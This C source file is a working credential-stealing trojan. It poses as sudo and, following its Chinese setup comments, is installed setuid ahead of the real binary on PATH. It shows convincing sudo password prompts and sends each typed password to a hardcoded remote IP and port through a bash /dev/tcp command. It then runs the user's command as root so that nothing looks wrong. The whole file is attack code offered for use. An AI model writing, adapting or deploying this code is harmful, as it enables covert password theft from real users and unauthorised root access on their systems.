/*********************************************************************************
 *Copyright(C),2020-2021,aplyc1a@protonmail.com
 *FileName: sudo.c
 *Author:   aplyc1a
 *Version:  v0.5
 *Date:     2020-08-07
 *Description:  生成文件后赋4755权限，/usr/share/Modules/bin/即可(PATH优先级)。
 *              你也可以通过替换掉原来的sudo，但需要将本文件里面的/usr/bin/sudo改成相应的路径。
 *Others:       已知问题:
                  1.无法控制sudo临时有效期
                  2.无法检查sudo是否首次运行
 *              使用前需要你自行修改适配的地方：Line 25、26、160。
 **********************************************************************************/
#include <stdio.h>
#include <unistd.h>
#include <termios.h>
#include <sys/time.h>
#include <stdlib.h>
#include <string.h>
#include <pwd.h>
#include <signal.h>

//这里需要改为你自己的接收地址，任意能看到接收信息的服务就可以。比如nc还有py http服务器。
#define RECVER_HOST "170.170.64.78"
#define RECVER_PORT "8000"

#define MAXPW 32
int attempts=0;
int lang_type=0;
struct termios old_kbd_mode;

void getpwd_sigint_handle(){
    printf("\n");
    if(attempts){
        if(lang_type==1){
            printf("sudo: %d 次错误密码尝试\n",attempts);
        }else{
            printf("sudo: %d incorrect password attempts\n",attempts);
        }
        
    }
    tcsetattr (0, TCSANOW, &old_kbd_mode);
    exit(1);
}

//这个函数是从网上找到，可以在实现linux下的密码无回显输入的同时，没有屏蔽信号量。我自己加了对Ctrl-C Ctrl-D的控制。
ssize_t getpasswd (char **pw, size_t sz, int mask, FILE *fp)
{
    //handle Ctrl^C
    struct sigaction sigIntHandler;
    sigIntHandler.sa_handler = getpwd_sigint_handle;
    sigemptyset(&sigIntHandler.sa_mask);
    sigIntHandler.sa_flags = 0;
    sigaction(SIGINT, &sigIntHandler, NULL);
    
    if (!pw || !sz || !fp) return -1;       /* validate input   */
#ifdef MAXPW
    if (sz > MAXPW) sz = MAXPW;
#endif

    if (*pw == NULL) {              /* reallocate if no address */
        void *tmp = realloc (*pw, sz * sizeof **pw);
        if (!tmp)
            return -1;
        memset (tmp, 0, sz);    /* initialize memory to 0   */
        *pw = tmp;
    }

    size_t idx = 0;         /* index, number of chars in read   */
    int c = 0;

    struct termios new_kbd_mode;

    if (tcgetattr (0, &old_kbd_mode)) { /* save orig settings   */
        fprintf (stderr, "%s() error: tcgetattr failed.\n", __func__);
        return -1;
    }   /* copy old to new */
    memcpy (&new_kbd_mode, &old_kbd_mode, sizeof(struct termios));

    new_kbd_mode.c_lflag &= ~(ICANON | ECHO);  /* new kbd flags */
    new_kbd_mode.c_cc[VTIME] = 0;
    new_kbd_mode.c_cc[VMIN] = 1;
    if (tcsetattr (0, TCSANOW, &new_kbd_mode)) {
        fprintf (stderr, "%s() error: tcsetattr failed.\n", __func__);
        return -1;
    }

    /* read chars from fp, mask if valid char specified */
    while (((c = fgetc (fp)) != '\n' && c != EOF && c != 4 && idx < sz - 1) ||
            (idx == sz - 1 && c == 127))
    {
        attempts++;
        if (c != 127) {
            if (31 < mask && mask < 127)    /* valid ascii char */
                fputc (mask, stdout);
            (*pw)[idx++] = c;
        }
        else if (idx > 0) {         /* handle backspace (del)   */
            if (31 < mask && mask < 127) {
                fputc (0x8, stdout);
                fputc (' ', stdout);
                fputc (0x8, stdout);
            }
            (*pw)[--idx] = 0;
        }
    }
    (*pw)[idx] = 0; /* null-terminate   */
    //handle Ctrl^D
    if(c == 4){
        getpwd_sigint_handle();
    }
    /* reset original keyboard  */
    if (tcsetattr (0, TCSANOW, &old_kbd_mode)) {
        fprintf (stderr, "%s() error: tcsetattr failed.\n", __func__);
        return -1;
    }

    if (idx == sz - 1 && c != '\n') /* warn if pw truncated */
        fprintf (stderr, " (%s() warning: truncated at %zu chars.)\n",
                __func__, sz - 1);

    return idx; /* number of chars in passwd    */
}

int get_language(){
    //printf("$LANG=%s\n",getenv("LANG"));
    //get $env,如果不是英文或中文，那就需要你自己在下面添加了。
    if(!strncmp(getenv("LANG"),"zh",2)){
        return 1;
    }else{
        return 2;
    }
}

void show_lecture(int lang_type){
    if(lang_type==1){
        printf("我们信任您已经从系统管理员那里了解了日常注意事项。\n");
        printf("总结起来无外乎这三点：\n");
        printf("    \n");
        printf("    #1) 尊重别人的隐私。\n");
        printf("    #2) 输入前要先考虑(后果和风险)。\n");
        printf("    #3) 权力越大，责任越大。\n");
        printf("    \n");
    }
    if(lang_type==2){
        printf("We trust you have received the usual lecture from the local System\n");
        printf("Administrator. It usually boils down to these three things:\n");
        printf("    \n");
        printf("    #1) Respect the privacy of others.\n");
        printf("    #2) Think before you type.\n");
        printf("    #3) With great power comes great responsibility.\n");
        printf("    \n");
    }
}

void fake_sudo(int lang_type, char *current_user){

    //用户第一次使用sudo时往往会弹一个lecture,如果你在目标设备上输入sudo可以看到很多提示信息，请打开下面的注释开关
    //show_lecture(lang_type);
    srand((unsigned)getpid());
    int loop,loop_max=rand()%3+1;
    int status = 0;
    
    for(loop=0; loop<loop_max; loop++){
        if(lang_type==1){
            //char *input_prompts=""
            printf("[sudo] %s 的密码：",current_user);
        }else{
            printf("[sudo] password for %s:",current_user);
        }
        char pw[MAXPW] = {0};
        char *password = pw;
        FILE *fp = stdin;
        attempts=loop;
        (void)getpasswd(&password, MAXPW, 0, fp);
        printf("\n");
        //printf("passwd=%s\n", password);
        //bash -c "echo '{walrus:123}' > /dev/tcp/127.0.0.1/18086"
        int cmd_sendpwd_length=strlen("bash -c \"echo '{")+strlen(current_user)+1+strlen(password)+\
        strlen("}' > /dev/tcp/")+strlen(RECVER_HOST)+1+strlen(RECVER_PORT)+1+strlen(" 2>/dev/null")+1;
        char *cmd_sendpwd=(char*)malloc(cmd_sendpwd_length);
        //printf("length:%d----\n",cmd_sendpwd_length-2);
        (void)snprintf(cmd_sendpwd, cmd_sendpwd_length, "bash -c \"echo '{%s:%s}' > /dev/tcp/%s/%s\" 2>/dev/null", current_user,password,RECVER_HOST,RECVER_PORT);
        //printf("cmd2send=%s\n",cmd_sendpwd);
        status = system(cmd_sendpwd);
        free(cmd_sendpwd);
        if(loop+1>=loop_max){
            break;
        }
        if(lang_type==1){
            printf("对不起，请重试。\n");
        }else{
            printf("Sorry, try again.\n");
        }
    }


}

int main(int argc, char *argv[]){
//解析入参
    int cmd_count=argc-1;
    int count=0,cmd_len=0;
    for (count = 1; count < argc; count++){
        cmd_len=cmd_len+strlen(argv[count]);
    }
    cmd_len+=argc-1;
    char *cmd=(char*)malloc(cmd_len);
    int cursor=0;
    for (count = 1; count < argc; count++){
        strcpy(cmd+cursor,argv[count]);
        cursor=cursor+strlen(argv[count]);
        cmd[cursor]=' ';
        cursor+=1;
    }
    cmd[cursor-1]='\0';
    //printf("cmd=%s\n",cmd);
    //如果参数内含有'-'选项
    if(cmd[0]=='-'){
        //system的执行有时会是用/bin/sh -c执行的，与bash不太一样。dash -c "bash -c {your command}"
        int cmd_redirect_length=strlen(cmd)+strlen("/bin/bash -c \"/usr/bin/sudo ")+strlen("\"")+1;
        char *cmd_redirect=(char*)malloc(cmd_redirect_length);
        (void)snprintf(cmd_redirect, cmd_redirect_length, \
             "/bin/bash -c \"/usr/bin/sudo %s\"", cmd);
        //printf("cmd(with -):%s\n", cmd_redirect);
        system(cmd_redirect);
        free(cmd_redirect);
        exit(1);
    }

    //如果是root执行的
    struct passwd *s_pw;
    s_pw = getpwuid(getuid());
    //printf("current user:%s\n",s_pw->pw_name);
    if(!strcmp(s_pw->pw_name,"root")){
        system(cmd);//bypass
        exit(0);
    }
    //非root用户,先偷密码,之后权限提升直接执行命令。
    lang_type = get_language();
    fake_sudo(lang_type, s_pw->pw_name);
    setuid(0);
    setgid(0);
    system(cmd);//bypass
    free(cmd);
    return 0;
}
